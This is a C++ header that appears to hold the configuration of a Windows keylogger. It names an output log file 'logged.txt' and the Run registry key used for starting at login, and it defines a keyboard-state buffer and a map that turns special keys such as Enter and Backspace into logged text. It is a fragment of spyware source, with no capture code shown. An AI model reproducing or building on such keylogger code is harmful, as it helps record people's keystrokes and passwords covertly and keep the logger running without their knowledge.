#pragma once

#include <windows.h>
#include <cstdint>
#include <string>
#include <unordered_map>

namespace configuration
{
		constexpr const wchar_t* outFile = L"logged.txt";
		constexpr const wchar_t* lpSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
		constexpr uint16_t keyboardStateSize = 256;
		constexpr uint8_t keyBufferSize = 4;
		constexpr uint8_t virtualKey = 0x56;

		const std::unordered_map<DWORD, std::wstring> keycodes
		{
				{ VK_RETURN, L"\n" },
				{ VK_ESCAPE, L"[ESCAPE]" },
				{ VK_BACK, L"[BACKSPACE]" }
		};
}
